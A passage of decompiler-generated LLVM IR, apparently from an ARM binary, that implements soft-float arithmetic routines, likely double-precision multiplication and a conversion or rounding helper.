  store i32 %v3_1603c, i32* %stack_var_-16, align 4
  %v6_1603c = load i32, i32* @r5, align 4
  %v9_1603c = load i32, i32* @r6, align 4
  store i32 2047, i32* @ip, align 4
  %v4_16048 = udiv i32 %arg1, 1048576
  %v5_16048 = urem i32 %v4_16048, 2048
  store i32 %v5_16048, i32* %r4.global-to-local, align 4
  %v6_16048 = icmp eq i32 %v5_16048, 0
  br i1 %v6_16048, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1603c
  %v5_1604c = udiv i32 %arg3, 1048576
  %v6_1604c = urem i32 %v5_1604c, 2048
  store i32 %v6_1604c, i32* @r5, align 4
  %v7_1604c = icmp eq i32 %v6_1604c, 0
  br i1 %v7_1604c, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_16050 = icmp eq i32 %v5_16048, 2047
  br i1 %v5_16050, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_16054 = icmp eq i32 %v6_1604c, 2047
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1603c, %bb, %bb41, %bb42
  %v0_16058 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_16054, %bb42 ], [ true, %dec_label_pc_1603c ]
  store i32 90204, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v0_16058, i32 ptrtoint (i32* @global_var_162d8.440 to i32))
  %v0_1605c = load i32, i32* %r4.global-to-local, align 4
  %v1_1605c = load i32, i32* @r5, align 4
  %v2_1605c = add i32 %v1_1605c, %v0_1605c
  store i32 %v2_1605c, i32* %r4.global-to-local, align 4
  %v2_16060 = xor i32 %arg3, %arg1
  %v1_16064 = load i32, i32* @ip, align 4
  %tmp = mul i32 %v1_16064, -2097152
  %v5_16064 = add i32 %tmp, -1
  %v6_16064 = and i32 %v5_16064, %arg1
  store i32 %v6_16064, i32* %r0.global-to-local, align 4
  %v6_16068 = and i32 %v5_16064, %arg3
  store i32 %v6_16068, i32* %r2.global-to-local, align 4
  %v4_1606c = mul i32 %arg1, 4096
  %v5_1606c = or i32 %v4_1606c, %arg2
  store i32 %v5_1606c, i32* @r5, align 4
  %v7_1606c = icmp eq i32 %v5_1606c, 0
  br i1 %v7_1606c, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_1607417 = or i32 %v6_16064, 1048576
  store i32 %v1_1607417, i32* %r0.global-to-local, align 4
  %v1_1607818 = or i32 %v6_16068, 1048576
  store i32 %v1_1607818, i32* %r2.global-to-local, align 4
  %v1_161b019 = and i32 %v2_16060, -2147483648
  store i32 %v1_161b019, i32* @r6, align 4
  br label %dec_label_pc_161b0

bb43:                                             ; preds = %.thread1
  %v5_16070 = mul i32 %arg3, 4096
  %v6_16070 = or i32 %v5_16070, %arg4
  store i32 %v6_16070, i32* @r5, align 4
  %v8_16070 = icmp eq i32 %v6_16070, 0
  %v1_16074 = or i32 %v6_16064, 1048576
  store i32 %v1_16074, i32* %r0.global-to-local, align 4
  %v1_16078 = or i32 %v6_16068, 1048576
  store i32 %v1_16078, i32* %r2.global-to-local, align 4
  %v1_161b0 = and i32 %v2_16060, -2147483648
  store i32 %v1_161b0, i32* @r6, align 4
  br i1 %v8_16070, label %dec_label_pc_161b0, label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %bb43
  store i32 %v1_161b0, i32* %stack_var_-40, align 4
  %v6_16084 = load i32, i32* @r7, align 4
  %v9_16084 = load i32, i32* @r8, align 4
  %v12_16084 = load i32, i32* @sb, align 4
  %v15_16084 = load i32, i32* @sl, align 4
  %v3_16088 = udiv i32 %arg2, 65536
  %v3_1608c = udiv i32 %arg4, 65536
  store i32 %v3_1608c, i32* %r8.global-to-local, align 4
  %v3_16090 = udiv i32 %v1_16074, 65536
  store i32 %v3_16090, i32* %sb.global-to-local, align 4
  %v3_16094 = udiv i32 %v1_16078, 65536
  %tmp59 = mul i32 %v3_16088, -65536
  %v5_16098 = add i32 %tmp59, -1
  %v6_16098 = and i32 %v5_16098, %arg2
  store i32 %v6_16098, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_1608c, -65536
  %v5_1609c = add i32 %tmp60, -1
  %v6_1609c = and i32 %v5_1609c, %arg4
  %tmp61 = mul i32 %v3_16090, -65536
  %v5_160a0 = add i32 %tmp61, -1
  %v6_160a0 = and i32 %v6_16064, %v5_160a0
  store i32 %v6_160a0, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_16094, -65536
  %v5_160a4 = add i32 %tmp62, -1
  %v6_160a4 = and i32 %v6_16068, %v5_160a4
  store i32 %v6_160a4, i32* %r2.global-to-local, align 4
  %v2_160a8 = mul i32 %v6_1609c, %v6_16098
  %v2_160ac = mul i32 %v3_1608c, %v6_16098
  %v2_160b8 = and i32 %v2_160ac, 32768
  %v3_160b8 = icmp ne i32 %v2_160b8, 0
  %v4_160b8 = udiv i32 %v2_160ac, 65536
  %v7_160b8 = zext i1 %v3_160b8 to i32
  %v2_160bc = mul i32 %v6_1609c, %v3_16088
  %tmp53 = add i32 %v2_160bc, %v2_160ac
  %tmp54 = mul i32 %tmp53, 65536
  %v5_160c0 = add i32 %tmp54, %v2_160a8
  store i32 %v5_160c0, i32* %ip.global-to-local, align 4
  %v2_160c4 = and i32 %v2_160bc, 32768
  %v3_160c4 = icmp ne i32 %v2_160c4, 0
  %v4_160c4 = udiv i32 %v2_160bc, 65536
  %v7_160c4 = zext i1 %v3_160c4 to i32
  %v2_160c8 = mul i32 %v3_16094, %v6_16098
  %v2_160d4 = and i32 %v2_160c8, 32768
  %v3_160d4 = icmp ne i32 %v2_160d4, 0
  %v4_160d4 = udiv i32 %v2_160c8, 65536
  %v7_160d4 = zext i1 %v3_160d4 to i32
  %v8_160d4 = add nuw nsw i32 %v7_160d4, %v4_160d4
  %v2_160d8 = mul i32 %v6_160a4, %v3_16088
  %v2_160e0 = and i32 %v2_160d8, 32768
  %v3_160e0 = icmp ne i32 %v2_160e0, 0
  %v4_160e0 = udiv i32 %v2_160d8, 65536
  %v6_160e0 = add nuw nsw i32 %v8_160d4, %v4_160e0
  %v7_160e0 = zext i1 %v3_160e0 to i32
  %v8_160e0 = add nuw nsw i32 %v6_160e0, %v7_160e0
  %v2_160e4 = mul i32 %v3_1608c, %v6_160a0
  %v2_160ec = and i32 %v2_160e4, 32768
  %v3_160ec = icmp ne i32 %v2_160ec, 0
  %v4_160ec = udiv i32 %v2_160e4, 65536
  %v6_160ec = add nuw nsw i32 %v8_160e0, %v4_160ec
  %v7_160ec = zext i1 %v3_160ec to i32
  %v8_160ec = add nuw nsw i32 %v6_160ec, %v7_160ec
  %v2_160f0 = mul i32 %v6_1609c, %v3_16090
  %v4_160f4 = mul i32 %v2_160f0, 65536
  %tmp55 = add i32 %v2_160d8, %v2_160c8
  %tmp56 = add i32 %tmp55, %v2_160e4
  %tmp57 = mul i32 %tmp56, 65536
  %v8_160c4 = add nuw nsw i32 %v7_160b8, %v4_160b8
  %v5_160d0 = add nuw nsw i32 %v8_160c4, %v4_160c4
  %v5_160dc = add nuw nsw i32 %v5_160d0, %v7_160c4
  %v5_160e8 = add i32 %v5_160dc, %v4_160f4
  %v5_160f4 = add i32 %v5_160e8, %tmp57
  %v2_160f8 = and i32 %v2_160f0, 32768
  %v3_160f8 = icmp ne i32 %v2_160f8, 0
  %v4_160f8 = udiv i32 %v2_160f0, 65536
  %v6_160f8 = add nuw nsw i32 %v8_160ec, %v4_160f8
  %v7_160f8 = zext i1 %v3_160f8 to i32
  %v8_160f8 = add i32 %v6_160f8, %v7_160f8
  %v2_160fc = mul i32 %v3_16094, %v6_160a0
  %v2_16100 = mul nuw i32 %v3_16094, %v3_16090
  %v4_16104 = mul i32 %v2_160fc, 65536
  %v5_16104 = add i32 %v8_160f8, %v4_16104
  %v2_16108 = and i32 %v2_160fc, 32768
  %v3_16108 = icmp ne i32 %v2_16108, 0
  %v4_16108 = udiv i32 %v2_160fc, 65536
  %v6_16108 = add i32 %v4_16108, %v2_16100
  %v7_16108 = zext i1 %v3_16108 to i32
  %v2_1610c = mul i32 %v6_160a4, %v3_16090
  %v4_16110 = mul i32 %v2_1610c, 65536
  %v5_16110 = add i32 %v5_16104, %v4_16110
  %v2_16114 = and i32 %v2_1610c, 32768
  %v3_16114 = icmp ne i32 %v2_16114, 0
  %v4_16114 = udiv i32 %v2_1610c, 65536
  %v7_16114 = zext i1 %v3_16114 to i32
  %v2_16118 = mul i32 %v6_16098, %v6_160a4
  %v2_1611c = add i32 %v2_16118, %v5_160f4
  %v3_1611c = icmp ult i32 %v2_1611c, %v5_160f4
  %v2_16120 = mul nuw i32 %v3_16088, %v3_16094
  %v3_16124 = add i32 %v5_16110, %v2_16120
  %v4_16124 = zext i1 %v3_1611c to i32
  %v5_16124 = add i32 %v4_16124, %v3_16124
  %v9_16124 = icmp ule i32 %v5_16124, %v5_16110
  %v10_16124 = icmp ult i32 %v3_16124, %v5_16110
  %v11_16124 = select i1 %v3_1611c, i1 %v9_16124, i1 %v10_16124
  %v2_16128 = mul i32 %v6_1609c, %v6_160a0
  %v2_1612c = zext i1 %v11_16124 to i32
  %v2_16130 = add i32 %v2_16128, %v2_1611c
  %v3_16130 = icmp ult i32 %v2_16130, %v2_1611c
  %v0_16134 = load i32, i32* %sb.global-to-local, align 4
  %v1_16134 = load i32, i32* %r8.global-to-local, align 4
  %v2_16134 = mul i32 %v1_16134, %v0_16134
  %v3_16138 = add i32 %v2_16134, %v5_16124
  %v4_16138 = zext i1 %v3_16130 to i32
  %v5_16138 = add i32 %v4_16138, %v3_16138
  %v9_16138 = icmp ule i32 %v5_16138, %v5_16124
  %v10_16138 = icmp ult i32 %v3_16138, %v5_16124
  %v11_16138 = select i1 %v3_16130, i1 %v9_16138, i1 %v10_16138
  %v2_1613c = mul i32 %v1_16134, %v3_16088
  %v2_16140 = zext i1 %v11_16138 to i32
  %v8_16108 = add i32 %v6_16108, %v4_16114
  %v6_16114 = add i32 %v8_16108, %v7_16108
  %v8_16114 = add i32 %v6_16114, %v7_16114
  %v3_1612c = add i32 %v8_16114, %v2_1612c
  %v3_16140 = add i32 %v3_1612c, %v2_16140
  %v2_16144 = add i32 %v2_1613c, %v2_16130
  %v3_16144 = icmp ult i32 %v2_16144, %v2_16130
  %v1_16148 = load i32, i32* %r2.global-to-local, align 4
  %v2_16148 = mul i32 %v1_16148, %v6_160a0
  %v3_1614c = add i32 %v5_16138, %v2_16148
  %v4_1614c = zext i1 %v3_16144 to i32
  %v5_1614c = add i32 %v4_1614c, %v3_1614c
  %v9_1614c = icmp ule i32 %v5_1614c, %v5_16138
  %v10_1614c = icmp ult i32 %v3_1614c, %v5_16138
  %v11_1614c = select i1 %v3_16144, i1 %v9_1614c, i1 %v10_1614c
  %v2_16150 = zext i1 %v11_1614c to i32
  %v3_16150 = add i32 %v2_16150, %v3_16140
  %v2_16154 = load i32, i32* %stack_var_-40, align 4
  store i32 %v6_16084, i32* @r7, align 4
  store i32 %v9_16084, i32* @r8, align 4
  store i32 %v12_16084, i32* @sb, align 4
  store i32 %v15_16084, i32* @sl, align 4
  %v0_16158 = load i32, i32* %ip.global-to-local, align 4
  %v2_16158 = icmp eq i32 %v0_16158, 0
  br i1 %v2_16158, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_16080
  %v2_1615c = or i32 %v2_16144, 1
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16080, %bb44
  %v0_16170 = phi i32 [ %v2_16144, %dec_label_pc_16080 ], [ %v2_1615c, %bb44 ]
  %v0_16160 = load i32, i32* %r4.global-to-local, align 4
  %v1_16160 = add i32 %v0_16160, -255
  %v2_16164 = icmp ugt i32 %v3_16150, 511
  %v2_16168 = icmp eq i1 %v2_16164, false
  %v5_16168 = sext i1 %v2_16168 to i32
  %v3_16168 = add nsw i32 %v5_16168, -1023
  %v6_16168 = add i32 %v3_16168, %v0_16160
  store i32 %v6_16168, i32* %r4.global-to-local, align 4
  %v3_1616c = icmp ugt i32 %v1_16160, 768
  br i1 %v3_1616c, label %dec_label_pc_1617c, label %dec_label_pc_16170

dec_label_pc_16170:                               ; preds = %bb45
  %v1_16170 = icmp slt i32 %v0_16170, 0
  %v2_16170 = mul i32 %v0_16170, 2
  %v3_16174 = mul i32 %v5_1614c, 2
  %v4_16174 = zext i1 %v1_16170 to i32
  %v5_16174 = or i32 %v4_16174, %v3_16174
  %v9_16174 = icmp ule i32 %v5_16174, %v5_1614c
  %v10_16174 = icmp ult i32 %v3_16174, %v5_1614c
  %v11_16174 = select i1 %v1_16170, i1 %v9_16174, i1 %v10_16174
  %v3_16178 = mul i32 %v3_16150, 2
  %v4_16178 = zext i1 %v11_16174 to i32
  %v5_16178 = or i32 %v4_16178, %v3_16178
  br label %dec_label_pc_1617c

dec_label_pc_1617c:                               ; preds = %bb45, %dec_label_pc_16170
  %v0_1618c = phi i32 [ %v0_16170, %bb45 ], [ %v2_16170, %dec_label_pc_16170 ]
  %v0_16184 = phi i32 [ %v5_1614c, %bb45 ], [ %v5_16174, %dec_label_pc_16170 ]
  %v1_1617c = phi i32 [ %v3_16150, %bb45 ], [ %v5_16178, %dec_label_pc_16170 ]
  %v4_1617c = mul i32 %v1_1617c, 2048
  %v4_16180 = udiv i32 %v0_16184, 2097152
  %v5_1617c = or i32 %v4_16180, %v2_16154
  %v5_16180 = or i32 %v5_1617c, %v4_1617c
  store i32 %v5_16180, i32* %r0.global-to-local, align 4
  %v3_16184 = mul i32 %v0_16184, 2048
  %v4_16188 = udiv i32 %v0_1618c, 2097152
  %v5_16188 = or i32 %v3_16184, %v4_16188
  store i32 %v5_16188, i32* %r1.global-to-local, align 4
  %v3_1618c = mul i32 %v0_1618c, 2048
  store i32 %v3_1618c, i32* @lr, align 4
  %v1_16190 = add i32 %v6_16168, -253
  store i32 %v1_16190, i32* @ip, align 4
  %v2_16190 = icmp ugt i32 %v6_16168, 252
  %v7_16190 = icmp eq i32 %v6_16168, 253
  %v2_16194 = xor i1 %v7_16190, true
  %v3_16194 = and i1 %v2_16190, %v2_16194
  br i1 %v3_16194, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1617c
  %v6_16194 = icmp ugt i32 %v1_16190, 1791
  %v11_16194 = icmp eq i32 %v1_16190, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1617c, %bb46
  %v1_16198 = phi i1 [ %v7_16190, %dec_label_pc_1617c ], [ %v11_16194, %bb46 ]
  %v0_16198 = phi i1 [ %v2_16190, %dec_label_pc_1617c ], [ %v6_16194, %bb46 ]
  %v2_16198 = xor i1 %v1_16198, true
  %v3_16198 = and i1 %v0_16198, %v2_16198
  call void @__pseudo_cond_branch(i1 %v3_16198, i32 ptrtoint (i32* @global_var_161dc.441 to i32))
  %v0_1619c = load i32, i32* @lr, align 4
  %v2_1619c = icmp slt i32 %v0_1619c, 0
  %v6_1619c = icmp eq i32 %v0_1619c, -2147483648
  %v1_161a0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1619c, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_161a0 = urem i32 %v1_161a0, 2
  %v3_161a0 = icmp ne i32 %v2_161a0, 0
  %v4_161a0 = udiv i32 %v1_161a0, 2
  store i32 %v4_161a0, i32* @lr, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_161a4 = phi i1 [ %v3_161a0, %bb48 ], [ %v2_1619c, %bb47 ]
  %v2_161a4 = zext i1 %v1_161a4 to i32
  %v3_161a4 = add i32 %v2_161a4, %v1_161a0
  store i32 %v3_161a4, i32* @r1, align 4
  %v0_161a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_161a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_161a8 = and i32 %v1_161a8, 4096
  %v3_161a8 = icmp ne i32 %v2_161a8, 0
  %v4_161a8 = mul i32 %v1_161a8, 1048576
  %v6_161a8 = add i32 %v4_161a8, %v0_161a8
  %v7_161a8 = zext i1 %v3_161a8 to i32
  %v8_161a8 = add i32 %v7_161a8, %v6_161a8
  store i32 %v8_161a8, i32* %r0.global-to-local, align 4
  %v2_161ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_161ac, i32* @r4, align 4
  store i32 %v6_1603c, i32* @r5, align 4
  store i32 %v9_1603c, i32* @r6, align 4
  ret i32 %v8_161a8

dec_label_pc_161b0:                               ; preds = %.thread, %bb43
  %v1_161b022 = phi i32 [ %v1_161b019, %.thread ], [ %v1_161b0, %bb43 ]
  %v1_1607821 = phi i32 [ %v1_1607818, %.thread ], [ %v1_16078, %bb43 ]
  %v1_1607420 = phi i32 [ %v1_1607417, %.thread ], [ %v1_16074, %bb43 ]
  %v2_161b4 = or i32 %v1_1607420, %v1_161b022
  %v2_161b8 = or i32 %arg4, %arg2
  store i32 %v2_161b8, i32* @r1, align 4
  %v2_161bc = xor i32 %v2_161b4, %v1_1607821
  store i32 %v2_161bc, i32* %r0.global-to-local, align 4
  %v4_161c0 = udiv i32 %v1_16064, 2
  %v5_161c0 = sub i32 %v2_1605c, %v4_161c0
  store i32 %v5_161c0, i32* %r4.global-to-local, align 4
  %v7_161c0 = sub i32 0, %v5_161c0
  %v8_161c0 = and i32 %v2_1605c, %v7_161c0
  %v11_161c0 = icmp eq i32 %v2_1605c, %v4_161c0
  %v7_161c4 = icmp sgt i32 %v2_1605c, %v4_161c0
  br i1 %v7_161c4, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_161b0
  %v10_161c4 = sub i32 %v1_16064, %v5_161c0
  store i32 %v10_161c4, i32* @r5, align 4
  %v12_161c4 = xor i32 %v5_161c0, %v1_16064
  %v13_161c4 = xor i32 %v10_161c4, %v1_16064
  %v14_161c4 = and i32 %v13_161c4, %v12_161c4
  %v17_161c4 = icmp eq i32 %v1_16064, %v5_161c0
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_161b0, %bb49
  %v2_161cc.in = phi i32 [ %v8_161c0, %dec_label_pc_161b0 ], [ %v14_161c4, %bb49 ]
  %v1_161cc.in = phi i32 [ %v5_161c0, %dec_label_pc_161b0 ], [ %v10_161c4, %bb49 ]
  %v0_161cc = phi i1 [ %v11_161c0, %dec_label_pc_161b0 ], [ %v17_161c4, %bb49 ]
  %v1_161cc = icmp slt i32 %v1_161cc.in, 0
  %v2_161cc = icmp slt i32 %v2_161cc.in, 0
  %v3_161c8 = xor i1 %v2_161cc, %v1_161cc
  %v4_161c8 = or i1 %v0_161cc, %v3_161c8
  br i1 %v4_161c8, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_161c828 = mul i32 %v5_161c0, 1048576
  %v10_161c829 = or i32 %v2_161bc, %v9_161c828
  store i32 %v10_161c829, i32* %r0.global-to-local, align 4
  %v7_161cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_161cc, i32* @r4, align 4
  store i32 %v6_1603c, i32* @r5, align 4
  store i32 %v9_1603c, i32* @r6, align 4
  ret i32 %v10_161c829

bb52:                                             ; preds = %bb50
  %v1_161d0 = or i32 %v2_161bc, 1048576
  store i32 %v1_161d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_161d8 = add i32 %v5_161c0, -1
  store i32 %v1_161d8, i32* @r4, align 4
  ret i32 %v1_161d0

; uselistorder directives
  uselistorder i32 %v5_161c0, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_161c0, { 2, 1, 0 }
  uselistorder i32 %v2_161bc, { 1, 0, 2 }
  uselistorder i32 %v1_161a0, { 2, 0, 1 }
  uselistorder i32 %v0_1619c, { 1, 0 }
  uselistorder i1 %v7_16190, { 1, 0 }
  uselistorder i1 %v1_16170, { 1, 0 }
  uselistorder i32 %v6_16168, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16170, { 1, 0, 2 }
  uselistorder i32 %v3_16150, { 1, 0, 2 }
  uselistorder i32 %v5_1614c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_1614c, { 1, 0 }
  uselistorder i1 %v3_16144, { 1, 0 }
  uselistorder i32 %v5_16138, { 1, 0, 2, 3 }
  uselistorder i32 %v3_16138, { 1, 0 }
  uselistorder i1 %v3_16130, { 1, 0 }
  uselistorder i32 %v2_16130, { 1, 0, 2 }
  uselistorder i32 %v5_16124, { 2, 1, 0, 3 }
  uselistorder i32 %v3_16124, { 1, 0 }
  uselistorder i1 %v3_1611c, { 1, 0 }
  uselistorder i32 %v2_1611c, { 1, 0, 2 }
  uselistorder i32 %v5_16110, { 2, 1, 0 }
  uselistorder i32 %v2_1610c, { 1, 2, 0 }
  uselistorder i32 %v2_160fc, { 0, 2, 1 }
  uselistorder i32 %v5_160f4, { 1, 0 }
  uselistorder i32 %v2_160f0, { 1, 2, 0 }
  uselistorder i32 %v2_160e4, { 1, 0, 2 }
  uselistorder i32 %v2_160d8, { 1, 0, 2 }
  uselistorder i32 %v2_160c8, { 1, 0, 2 }
  uselistorder i32 %v2_160bc, { 0, 2, 1 }
  uselistorder i32 %v2_160ac, { 1, 0, 2 }
  uselistorder i32 %v6_160a4, { 1, 0, 2, 3 }
  uselistorder i32 %v6_160a0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_16098, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_16094, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_16090, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_1608c, { 3, 2, 0, 1 }
  uselistorder i32 %v3_16088, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_16078, { 1, 0, 2 }
  uselistorder i32 %v1_16074, { 1, 0, 2 }
  uselistorder i32 %v6_16068, { 0, 2, 1, 3 }
  uselistorder i32 %v6_16064, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16064, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_16060, { 1, 0 }
  uselistorder i32 %v2_1605c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_1604c, { 2, 1, 0 }
  uselistorder i32 %v5_16048, { 2, 1, 0 }
  uselistorder i32 %v9_1603c, { 1, 0 }
  uselistorder i32 %v6_1603c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 10, 2, 3, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i32 32768, { 4, 5, 6, 7, 8, 9, 10, 11, 3, 2, 0, 1 }
  uselistorder i32 65536, { 2, 0, 3, 86, 4, 87, 1, 5, 6, 7, 8, 88, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 25, 21, 26, 22, 27, 23, 28, 24, 29, 30, 31, 35, 32, 36, 33, 37, 34, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 78, 81, 83, 84, 82, 85 }
  uselistorder i32* @sl, { 2, 3, 4, 5, 6, 7, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 24, 25, 26 }
  uselistorder i32* @sb, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18 }
  uselistorder i32* @r8, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 26, 27, 24, 13, 14, 15, 16, 17, 18, 19, 0, 1, 20, 21, 22, 23, 2, 25 }
  uselistorder i32* @r7, { 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 55, 5, 6, 1, 7, 8, 30, 31, 32, 33, 3, 4, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0, 9, 10, 45, 46, 47, 48, 11, 53, 54, 49, 50, 51, 52 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_161b0, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1617c, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_161dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_161dc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_161dc = load i1, i1* @cpsr_z, align 1
  %v1_161dc = load i1, i1* @cpsr_n, align 1
  %v2_161dc = load i1, i1* @cpsr_v, align 1
  %v3_161dc = xor i1 %v1_161dc, %v2_161dc
  %v4_161dc = or i1 %v0_161dc, %v3_161dc
  br i1 %v4_161dc, label %dec_label_pc_161e0, label %dec_label_pc_16344

dec_label_pc_161e0:                               ; preds = %dec_label_pc_161dc
  %v0_161e0 = load i32, i32* @r4, align 4
  %v4_161e0 = add i32 %v0_161e0, 54
  %v6_161e0 = sub i32 0, %v0_161e0
  %v7_161e0 = and i32 %v4_161e0, %v6_161e0
  %v8_161e0 = icmp slt i32 %v7_161e0, 0
  store i1 %v8_161e0, i1* @cpsr_v, align 1
  %v9_161e0 = icmp slt i32 %v4_161e0, 0
  store i1 %v9_161e0, i1* @cpsr_n, align 1
  %v10_161e0 = icmp eq i32 %v4_161e0, 0
  store i1 %v10_161e0, i1* @cpsr_z, align 1
  %v7_161e4 = icmp sgt i32 %v0_161e0, -54
  br i1 %v7_161e4, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_161e0
  store i32 0, i32* @r1, align 4
  %v8_161e8 = load i32, i32* %r0.global-to-local, align 4
  %v9_161e8 = and i32 %v8_161e8, -2147483648
  store i32 %v9_161e8, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_161e8

bb6:                                              ; preds = %dec_label_pc_161e0
  %v1_161f0 = sub i32 0, %v0_161e0
  %v2_161f4 = sub i32 -32, %v0_161e0
  %v4_161f4 = add i32 %v0_161e0, 31
  %v5_161f4 = and i32 %v4_161f4, %v1_161f0
  %v6_161f4 = icmp slt i32 %v5_161f4, 0
  store i1 %v6_161f4, i1* @cpsr_v, align 1
  %v6_161f8 = icmp slt i32 %v1_161f0, 32
  br i1 %v6_161f8, label %dec_label_pc_161fc, label %dec_label_pc_16260

dec_label_pc_161fc:                               ; preds = %bb6
  %v1_161fc = add i32 %v2_161f4, 12
  %v8_16200 = icmp sgt i32 %v1_161fc, 0
  br i1 %v8_16200, label %dec_label_pc_16234, label %dec_label_pc_16204

dec_label_pc_16204:                               ; preds = %dec_label_pc_161fc
  %v1_16204 = add i32 %v2_161f4, 32
  %v1_16208 = sub i32 0, %v2_161f4
  %v0_1620c = load i32, i32* @r1, align 4
  %v6_1620c = shl i32 %v0_1620c, %v1_16208
  %v2_16210 = add i32 %v2_161f4, 31
  %v3_16210 = shl i32 1, %v2_16210
  %v6_16210 = lshr i32 %v0_1620c, %v1_16204
  %v1_16214 = load i32, i32* %r0.global-to-local, align 4
  %v7_16214 = shl i32 %v1_16214, %v1_16208
  %v8_16214 = or i32 %v7_16214, %v6_16210
  %v1_16218 = and i32 %v1_16214, -2147483648
  %tmp = bitcast i32 %v1_16214 to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_1621c = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_1620c, 0
  %v4_16220 = zext i1 %tmp14 to i32
  %v5_16220 = add i32 %v8_16214, %v4_16220
  store i32 %v5_16220, i32* @r1, align 4
  %v5_16224 = and i32 %v1_1621c, %v3_16210
  %v6_16224 = icmp ne i32 %v5_16224, 0
  %v7_16224 = lshr i32 %v1_1621c, %v1_16204
  %v9_16224 = add i32 %v7_16224, %v1_16218
  %v10_16224 = zext i1 %v6_16224 to i32
  %v11_16224 = add i32 %v9_16224, %v10_16224
  store i32 %v11_16224, i32* %r0.global-to-local, align 4
  %v19_16224 = add i32 %v11_16224, %v10_16224
  %v20_16224 = xor i32 %v19_16224, %v1_16214
  %v21_16224 = xor i32 %v19_16224, %v7_16224
  %v22_16224 = and i32 %v20_16224, %v21_16224
  %v23_16224 = icmp slt i32 %v22_16224, 0
  store i1 %v23_16224, i1* @cpsr_v, align 1
  %v0_16228 = load i32, i32* @lr, align 4
  %v3_16228 = mul i32 %v6_1620c, 2
  %v4_16228 = or i32 %v0_16228, %v3_16228
  %v5_16228 = icmp slt i32 %v4_16228, 0
  store i1 %v5_16228, i1* @cpsr_n, align 1
  %v6_16228 = icmp eq i32 %v4_16228, 0
  store i1 %v6_16228, i1* @cpsr_z, align 1
  br i1 %v6_16228, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_16204
  %tmp15 = sext i1 %tmp14 to i32
  %v6_1622c = add nsw i32 %tmp15, -1
  %v7_1622c = and i32 %v5_16220, %v6_1622c
  store i32 %v7_1622c, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_16204, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
